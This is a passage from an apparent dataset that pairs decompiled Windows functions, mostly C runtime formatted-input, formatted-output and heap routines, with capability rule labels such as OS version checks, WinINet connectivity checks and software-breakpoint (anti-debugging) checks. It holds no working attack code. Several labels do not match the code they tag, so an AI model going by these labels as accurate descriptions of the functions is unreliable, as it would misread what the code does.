                  *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.0041ae25(uVar11);\n                        if (iVar7 == 0) goto code_r0x0041592c;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x0041592c;\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 3;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) * 10;\n                        }\n                    }\ncode_r0x00415932:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x30 + uVar11;\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x00415990;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.00414d3e();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.0041bad2(uVar11, uVar9);\n                        }\n                    }\ncode_r0x00415990:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                *(unaff_EBP + -0x1a0) = -*(unaff_EBP + -0x1a0);\n            }\n        }\n        else {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0041ae5f(uVar11);\n                        if (iVar7 != 0) {\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 4;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 4 | uVar4 >> 0x1c;\n                            iVar7 = fcn.0041ae25(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x0041581d;\n                        }\ncode_r0x00415817:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.0041ae25(uVar11);\n                        if (iVar7 == 0) goto code_r0x00415817;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x00415817;\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 3;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 3 | uVar4 >> 0x1d;\n                        }\n                        else {\n                            var_4h_2 = *(unaff_EBP + -0x1ac);\n                            uVar22 = fcn.004128f0();\n                            *(unaff_EBP + -0x1ac) = uVar22;\n                            *(unaff_EBP + -0x1a8) = uVar22 >> 0x20;\n                        }\n                    }\ncode_r0x0041581d:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        uVar4 = uVar11 - 0x30;\n                        puVar2 = unaff_EBP + -0x1ac;\n                        uVar5 = *puVar2;\n                        *puVar2 = *puVar2 + uVar4;\n                        *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) + (uVar4 >> 0x1f) + CARRY4(uVar5, uVar4);\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x0041587b;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.00414d3e();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.0041bad2(uVar11, uVar9);\n                        }\n                    }\ncode_r0x0041587b:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                iVar7 = *(unaff_EBP + -0x1ac);\n                *(unaff_EBP + -0x1ac) = -iVar7;\n                *(unaff_EBP + -0x1a8) = -(*(unaff_EBP + -0x1a8) + (iVar7 != 0));\n            }\n        }\n        if (uVar14 == 0x46) {\n            *(unaff_EBP + -0x19c) = 0;\n        }\n        if (*(unaff_EBP + -0x19c) != 0) {\n            if (*(unaff_EBP + -0x18e) == '\\0') {\n                *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n                puVar15 = *(unaff_EBP + -0x1b0);\n                uVar9 = *(unaff_EBP + -0x1a0);\ncode_r0x004159e6:\n                if (*(unaff_EBP + -0x1c8) == 0) {\n                    if (*(unaff_EBP + -0x18d) == '\\0') {\n                        *puVar15 = uVar9;\n                    }\n                    else {\n                        *puVar15 = uVar9;\n                    }\n                }\n                else {\n                    *puVar15 = *(unaff_EBP + -0x1ac);\n                    puVar15[1] = *(unaff_EBP + -0x1a8);\n                }\n            }\n            goto code_r0x00415a12;\n        }\n        goto code_r0x00415ab3;\n    }\n    if (uVar14 == 0x6f) goto code_r0x00415712;\n    if (uVar14 == 99) {\n        if (iVar7 == 0) {\n            *(unaff_EBP + -0x1b4) = 1;\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 1;\n        }\n        goto code_r0x004152d8;\n    }\n    if (uVar14 == 100) goto code_r0x00415712;\n    if (uVar14 < 0x65) {\ncode_r0x00415317:\n        if (**(unaff_EBP + 0xc) != *(unaff_EBP + -0x194)) goto code_r0x00415325;\n        *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + -1;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + 0x10) = *(unaff_EBP + -0x1dc);\n        }\n    }\n    else {\n        if (0x67 < uVar14) {\n            if (uVar14 == 0x69) {\n                uVar14 = 100;\n                goto code_r0x0041509f;\n            }\n            if (uVar14 != 0x6e) goto code_r0x00415317;\n            uVar9 = *(unaff_EBP + -0x184);\n            if (*(unaff_EBP + -0x18e) != '\\0') goto code_r0x00415a12;\n            goto code_r0x004159e6;\n        }\n        pcVar18 = unaff_EBP + -0x17c;\n        iVar7 = *(unaff_EBP + -0x194);\n        if (iVar7 == 0x2d) {\n            *(unaff_EBP + -0x17c) = 0x2d;\n            pcVar18 = unaff_EBP + -0x17b;\ncode_r0x004150de:\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar9 = *(unaff_EBP + 8);\n            iVar7 = fcn.00414d3e();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        else {\n            if (iVar7 == 0x2b) goto code_r0x004150de;\n            uVar9 = *(unaff_EBP + 8);\n        }\n        if ((*(unaff_EBP + -0x1b4) == 0) || (0x15d < *(unaff_EBP + -0x18c))) {\n            *(unaff_EBP + -0x18c) = 0x15d;\n        }\n        while( true ) {\n            iVar8 = fcn.0041ae25(iVar7);\n            if ((iVar8 == 0) ||\n               (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0)) break;\n            *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n            *pcVar18 = iVar7;\n            pcVar18 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00414d3e();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        if ((*0x464924 == iVar7) &&\n           (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00414d3e();\n            *pcVar18 = *0x464924;\n            while( true ) {\n                pcVar18 = pcVar18 + 1;\n                *(unaff_EBP + -0x194) = iVar7;\n                iVar8 = fcn.0041ae25(iVar7);\n                if ((iVar8 == 0) ||\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0))\n                break;\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar18 = iVar7;\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.00414d3e();\n            }\n        }\n        pcVar19 = pcVar18;\n        if ((*(unaff_EBP + -0x19c) != 0) &&\n           (((iVar7 == 0x65 || (iVar7 == 0x45)) &&\n            (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)))) {\n            *pcVar18 = 'e';\n            pcVar19 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00414d3e();\n            *(unaff_EBP + -0x194) = iVar7;\n            if (iVar7 == 0x2d) {\n                *pcVar19 = '-';\n                pcVar19 = pcVar18 + 2;\ncode_r0x00415218:\n                iVar8 = *(unaff_EBP + -0x18c);\n                *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n                if (iVar8 != 0) goto code_r0x00415249;\n                *(unaff_EBP + -0x18c) = 0;\n            }\n            else if (iVar7 == 0x2b) goto code_r0x00415218;\n            while ((iVar8 = fcn.0041ae25(iVar7),  iVar8 != 0 &&\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0))) {\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar19 = iVar7;\n                pcVar19 = pcVar19 + 1;\ncode_r0x00415249:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.00414d3e();\n                *(unaff_EBP + -0x194) = iVar7;\n            }\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        if (iVar7 != -1) {\n            fcn.0041bad2(iVar7, uVar9);\n        }\n        if (*(unaff_EBP + -0x19c) == 0) goto code_r0x00415ab3;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n            *pcVar19 = '\\0';\n            (**0x464378)(*(unaff_EBP + -0x18d) + -1, *(unaff_EBP + -0x1b0), unaff_EBP + -0x17c);\n        }\n    }\ncode_r0x00415a12:\n    *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + '\\x01';\n    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\ncode_r0x00415a94:\n    if ((*(unaff_EBP + -0x194) == -1) && ((**(unaff_EBP + 0xc) != '%' || ((*(unaff_EBP + 0xc))[1] != 'n'))))\n    goto code_r0x00415ab3;\n    goto code_r0x00414dc1;\ncode_r0x004156ad:\n    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n    if (uVar11 != 0xffffffff) {\n        fcn.0041bad2(uVar11, *(unaff_EBP + 8));\n    }\ncode_r0x004156c3:\n    if (puVar20 == puVar15) goto code_r0x00415ab3;\n    if ((*(unaff_EBP + -0x18e) == '\\0') &&\n       (*(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1,  *(unaff_EBP + -0x1c0) != 99)) {\n        if (*(unaff_EBP + -0x196) == '\\0') {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n        else {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n    }\n    goto code_r0x00415a12;\n}\n",
        "token_count": 10100
    },
    "00415c6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00415c6a(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_EDI;\n    \n    if (((*(unaff_EDI + 0xc) & 0x40) == 0) || (*(unaff_EDI + 8) != 0)) {\n        do {\n            if (param_1 < 1) {\n                return;\n            }\n            param_1 = param_1 + -1;\n            fcn.00415c13();\n        } while (*in_EAX != -1);\n    }\n    else {\n        *in_EAX = *in_EAX + param_1;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00415cc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415cc0(uint param_1, uint8_t *param_2, int32_t **param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    char *arg_ch;\n    bool bVar11;\n    int64_t iVar12;\n    int32_t *piStack600;\n    int32_t *piStack596;\n    int32_t iStack588;\n    int32_t iStack584;\n    uint uStack580;\n    int32_t iStack576;\n    int32_t iStack572;\n    int32_t *piStack568;\n    int32_t iStack564;\n    int32_t *piStack560;\n    int32_t iStack556;\n    uchar uStack552;\n    char cStack551;\n    int32_t iStack548;\n    int32_t iStack544;\n    int32_t *piStack540;\n    int32_t *piStack536;\n    uint32_t uStack532;\n    int32_t aiStack528 [127];\n    uint uStack17;\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    iStack544 = 0;\n    iStack548 = 0;\n    piStack568 = NULL;\n    uVar10 = *param_2;\n    iVar7 = 0;\n    puVar2 = param_2;\n    ppiVar3 = param_3;\n    do {\n        if ((uVar10 == 0) || (param_2 = puVar2 + 1,  iStack548 < 0)) {\n            fcn.0041176c();\n            return;\n        }\n        if ((uVar10 < ' ') || ('x' < uVar10)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = *(uVar10 + 0x455f68) & 0xf;\n        }\n        iStack584 = *(iVar7 + 0x455f88 + uVar5 * 8) >> 4;\n        param_3 = ppiVar3;\n    // switch table (8 cases) at 0x41649a\n        switch(iStack584) {\n        case 0:\ncode_r0x00415edc:\n            iStack564 = 0;\n            if ((*(*0x46495c + 1 + uVar10 * 2) & 0x80) != 0) {\n                fcn.00415c13();\n                param_2 = puVar2 + 2;\n            }\n            fcn.00415c13();\n            break;\n        case 1:\n            piStack536 = 0xffffffff;\n            uStack580 = 0;\n            iStack572 = 0;\n            piStack560 = NULL;\n            iStack556 = 0;\n            uStack532 = 0;\n            iStack564 = 0;\n            break;\n        case 2:\n            if (uVar10 == 0x20) {\n                uStack532 = uStack532 | 2;\n            }\n            else if (uVar10 == 0x23) {\n                uStack532 = uStack532 | 0x80;\n            }\n            else if (uVar10 == 0x2b) {\n                uStack532 = uStack532 | 1;\n            }\n            else if (uVar10 == 0x2d) {\n                uStack532 = uStack532 | 4;\n            }\n            else if (uVar10 == 0x30) {\n                uStack532 = uStack532 | 8;\n            }\n            break;\n        case 3:\n            if (uVar10 == 0x2a) {\n                piStack560 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack560 < 0) {\n                    uStack532 = uStack532 | 4;\n                    piStack560 = -piStack560;\n                }\n            }\n            else {\n                piStack560 = uVar10 + -0x30 + piStack560 * 10;\n            }\n            break;\n        case 4:\n            piStack536 = NULL;\n            break;\n        case 5:\n            if (uVar10 == 0x2a) {\n                piStack536 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack536 < 0) {\n                    piStack536 = 0xffffffff;\n                }\n            }\n            else {\n                piStack536 = uVar10 + -0x30 + piStack536 * 10;\n            }\n            break;\n        case 6:\n            if (uVar10 == 0x49) {\n                uVar1 = *param_2;\n                if ((uVar1 == 0x36) && (puVar2[2] == 0x34)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 | 0x8000;\n                }\n                else if ((uVar1 == 0x33) && (puVar2[2] == 0x32)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 & 0xffff7fff;\n                }\n                else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                         ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                    iStack584 = 0;\n                    goto code_r0x00415edc;\n                }\n            }\n            else if (uVar10 == 0x68) {\n                uStack532 = uStack532 | 0x20;\n            }\n            else if (uVar10 == 0x6c) {\n                uStack532 = uStack532 | 0x10;\n            }\n            else if (uVar10 == 0x77) {\n                uStack532 = uStack532 | 0x800;\n            }\n            break;\n        case 7:\n            if (uVar10 < 'h') {\n                if (uVar10 < 'e') {\n                    if (uVar10 < 'Y') {\n                        if (uVar10 != 0x58) {\n                            if (uVar10 == 0x43) {\n                                if ((uStack532 & 0x830) == 0) {\n                                    uStack532 = uStack532 | 0x800;\n                                }\n                                goto code_r0x00415fe5;\n                            }\n                            if ((uVar10 != 0x45) && (uVar10 != 0x47)) {\n                                if (uVar10 == 0x53) {\n                                    if ((uStack532 & 0x830) == 0) {\n                                        uStack532 = uStack532 | 0x800;\n                                    }\n                                    goto code_r0x00415f68;\n                                }\n                                goto code_r0x0041635d;\n                            }\n                            uStack580 = 1;\n                            uVar10 = uVar10 + 0x20;\n                            goto code_r0x00415fb9;\n                        }\ncode_r0x00416203:\n                        iStack576 = 7;\ncode_r0x00416206:\n                        iStack544 = 0x10;\n                        if ((uStack532 & 0x80) != 0) {\n                            cStack551 = iStack576 + 'Q';\n                            uStack552 = 0x30;\n                            iStack556 = 2;\n                        }\n                        goto code_r0x00416036;\n                    }\n                    if (uVar10 == 0x5a) {\n                        param_3 = ppiVar3 + 1;\n                        piVar8 = *ppiVar3;\n                        piVar6 = *0x464388;\n                        piVar4 = *0x464388;\n                        if ((piVar8 == NULL) || (piStack540 = piVar8[1],  piVar4 = *0x464388,  piStack540 == NULL))\n                        goto code_r0x00416177;\n                        iStack544 = *piVar8;\n                        if ((uStack532 & 0x800) == 0) {\n                            iStack564 = 0;\n                        }\n                        else {\n                            iStack544 = iStack544 / 2;\n                            iStack564 = 1;\n                        }\n                    }\n                    else if (uVar10 == 99) {\ncode_r0x00415fe5:\n                        if ((uStack532 & 0x810) == 0) {\n                            aiStack528[0]._0_1_ = *ppiVar3;\n                            iStack544 = 1;\n                        }\n                        else {\n                            iStack544 = fcn.0041c247(aiStack528, *ppiVar3);\n                            if (iStack544 < 0) {\n                                iStack572 = 1;\n                            }\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = aiStack528;\n                    }\n                    else if (uVar10 == 100) goto code_r0x0041602b;\n                }\n                else {\ncode_r0x00415fb9:\n                    uStack532 = uStack532 | 0x40;\n                    piVar8 = aiStack528;\n                    piVar6 = aiStack528;\n                    if (piStack536 < 0) {\n                        piStack536 = 0x6;\n                    }\n                    else if (piStack536 == NULL) {\n                        if (uVar10 == 0x67) {\n                            piStack536 = 0x1;\n                        }\n                    }\n                    else {\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                        if ((0xa3 < piStack536) &&\n                           (piStack540 = aiStack528,  piStack568 = fcn.0041101f(piStack536 + 0x15d), \n                           piVar8 = piStack568,  piVar6 = piStack568,  piStack568 == NULL)) {\n                            piStack536 = 0xa3;\n                            piVar8 = aiStack528;\n                            piVar6 = piStack540;\n                        }\n                    }\n                    piStack540 = piVar6;\n                    piStack600 = *ppiVar3;\n                    param_3 = ppiVar3 + 2;\n                    piStack596 = ppiVar3[1];\n                    (**0x464370)(&piStack600, piVar8, uVar10, piStack536, uStack580);\n                    uVar5 = uStack532 & 0x80;\n                    if ((uVar5 != 0) && (piStack536 == NULL)) {\n                        (**0x46437c)(piVar8);\n                    }\n                    if ((uVar10 == 0x67) && (uVar5 == 0)) {\n                        (**0x464374)(piVar8);\n                    }\n                    piVar6 = piVar8;\n                    piVar4 = piStack540;\n                    if (*piVar8 == '-') {\n                        uStack532 = uStack532 | 0x100;\n                        piVar6 = piVar8 + 1;\n                        piVar4 = piVar8 + 1;\n                    }\ncode_r0x00416177:\n                    piStack540 = piVar4;\n                    iStack544 = fcn.00411cb0(piVar6);\n                }\ncode_r0x0041635d:\n                uVar5 = uStack532;\n                if (iStack572 == 0) {\n                    if ((uStack532 & 0x40) != 0) {\n                        if ((uStack532 & 0x100) == 0) {\n                            if ((uStack532 & 1) == 0) {\n                                if ((uStack532 & 2) == 0) goto code_r0x00416395;\n                                uStack552 = 0x20;\n                            }\n                            else {\n                                uStack552 = 0x2b;\n                            }\n                        }\n                        else {\n                            uStack552 = 0x2d;\n                        }\n                        iStack556 = 1;\n                    }\ncode_r0x00416395:\n                    arg_ch = piStack560 + (-iStack544 - iStack556);\n                    if ((uStack532 & 0xc) == 0) {\n                        fcn.00415c46(0x20, arg_ch, param_1);\n                    }\n                    fcn.00415c6a(iStack556);\n                    if (((uVar5 & 8) != 0) && ((uVar5 & 4) == 0)) {\n                        fcn.00415c46(0x30, arg_ch, param_1);\n                    }\n                    if ((iStack564 == 0) || (iStack544 < 1)) {\n                        fcn.00415c6a(iStack544);\n                    }\n                    else {\n                        iStack588 = iStack544;\n                        piVar8 = piStack540;\n                        do {\n                            iStack588 = iStack588 + -1;\n                            iVar7 = fcn.0041c247(&uStack17 + 1, *piVar8);\n                            piVar8 = piVar8 + 2;\n                            if (iVar7 < 1) break;\n                            fcn.00415c6a(iVar7);\n                        } while (iStack588 != 0);\n                    }\n                    if ((uStack532 & 4) != 0) {\n                        fcn.00415c46(0x20, arg_ch, param_1);\n                    }\n                }\n            }\n            else {\n                if (uVar10 == 0x69) {\ncode_r0x0041602b:\n                    uStack532 = uStack532 | 0x40;\ncode_r0x0041602f:\n                    iStack544 = 10;\ncode_r0x00416036:\n                    if ((uStack532 & 0x8000) == 0) {\n                        param_3 = ppiVar3 + 1;\n                        if ((uStack532 & 0x20) == 0) {\n                            piVar8 = *ppiVar3;\n                            if ((uStack532 & 0x40) == 0) {\n                                piVar6 = NULL;\n                                goto code_r0x004162a7;\n                            }\n                        }\n                        else if ((uStack532 & 0x40) == 0) {\n                            piVar8 = *ppiVar3;\n                        }\n                        else {\n                            piVar8 = *ppiVar3;\n                        }\n                        piVar6 = piVar8 >> 0x1f;\n                    }\n                    else {\n                        piVar8 = *ppiVar3;\n                        piVar6 = ppiVar3[1];\n                        param_3 = ppiVar3 + 2;\n                    }\ncode_r0x004162a7:\n                    if ((((uStack532 & 0x40) != 0) && (piVar6 < 1)) && (piVar6 < 0)) {\n                        bVar11 = piVar8 != NULL;\n                        piVar8 = -piVar8;\n                        piVar6 = -(piVar6 + bVar11);\n                        uStack532 = uStack532 | 0x100;\n                    }\n                    if ((uStack532 & 0x8000) == 0) {\n                        piVar6 = NULL;\n                    }\n                    iVar12 = CONCAT44(piVar6, piVar8);\n                    if (piStack536 < 0) {\n                        piStack536 = 0x1;\n                    }\n                    else {\n                        uStack532 = uStack532 & 0xfffffff7;\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                    }\n                    if ((piVar8 | piVar6) == 0) {\n                        iStack556 = 0;\n                    }\n                    piVar8 = &uStack17;\n                    while( true ) {\n                        iVar7 = iVar12;\n                        piVar6 = piStack536 + -1;\n                        if ((piStack536 < 1) && (iVar12 == 0)) break;\n                        piStack536 = piVar6;\n                        iVar12 = fcn.0041c270();\n                        iVar9 = extraout_ECX + 0x30;\n                        if (0x39 < iVar9) {\n                            iVar9 = iVar9 + iStack576;\n                        }\n                        *piVar8 = iVar9;\n                        piVar8 = piVar8 + -1;\n                        iStack588 = iVar7;\n                    }\n                    iStack544 = &uStack17 + -piVar8;\n                    piStack540 = piVar8 + 1;\n                    piStack536 = piVar6;\n                    if (((uStack532 & 0x200) != 0) && ((*piStack540 != '0' || (iStack544 == 0)))) {\n                        *piVar8 = '0';\n                        iStack544 = &uStack17 + -piVar8 + 1;\n                        piStack540 = piVar8;\n                    }\n                    goto code_r0x0041635d;\n                }\n                if (uVar10 != 0x6e) {\n                    if (uVar10 == 0x6f) {\n                        iStack544 = 8;\n                        if ((uStack532 & 0x80) != 0) {\n                            uStack532 = uStack532 | 0x200;\n                        }\n                        goto code_r0x00416036;\n                    }\n                    if (uVar10 == 0x70) {\n                        piStack536 = 0x8;\n                        goto code_r0x00416203;\n                    }\n                    if (uVar10 == 0x73) {\ncode_r0x00415f68:\n                        piVar8 = piStack536;\n                        if (piStack536 == 0xffffffff) {\n                            piVar8 = 0x7fffffff;\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = *ppiVar3;\n                        if ((uStack532 & 0x810) == 0) {\n                            piVar6 = piStack540;\n                            if (piStack540 == NULL) {\n                                piVar6 = *0x464388;\n                                piStack540 = *0x464388;\n                            }\n                            for (; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != '\\0')); piVar6 = piVar6 + 1) {\n                            }\n                            iStack544 = piVar6 - piStack540;\n                        }\n                        else {\n                            if (piStack540 == NULL) {\n                                piStack540 = *0x46438c;\n                            }\n                            iStack564 = 1;\n                            for (piVar6 = piStack540; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != 0));\n                                piVar6 = piVar6 + 2) {\n                            }\n                            iStack544 = piVar6 - piStack540 >> 1;\n                        }\n                        goto code_r0x0041635d;\n                    }\n                    if (uVar10 != 0x75) {\n                        if (uVar10 != 0x78) goto code_r0x0041635d;\n                        iStack576 = 0x27;\n                        goto code_r0x00416206;\n                    }\n                    goto code_r0x0041602f;\n                }\n                param_3 = ppiVar3 + 1;\n                if ((uStack532 & 0x20) == 0) {\n                    **ppiVar3 = iStack548;\n                }\n                else {\n                    **ppiVar3 = iStack548;\n                }\n                iStack572 = 1;\n            }\n            if (piStack568 != NULL) {\n                fcn.00411031(piStack568);\n                piStack568 = NULL;\n            }\n        }\n        uVar10 = *param_2;\n        iVar7 = iStack584;\n        puVar2 = param_2;\n        ppiVar3 = param_3;\n    } while( true );\n}\n",
        "token_count": 4446
    },
    "00416656": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00416656(void)\n\n{\n    if ((*0x467088 == 2) && (4 < *0x467094)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 46
    },
    "00416670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.00416670(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x468700 = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x468700 == 0) {\n        return 0;\n    }\n    *0x468704 = fcn.00416656();\n    if ((*0x468704 == 3) && (iVar1 = fcn.0041675b(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x468700);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 161
    },
    "004167ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004167ce(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n          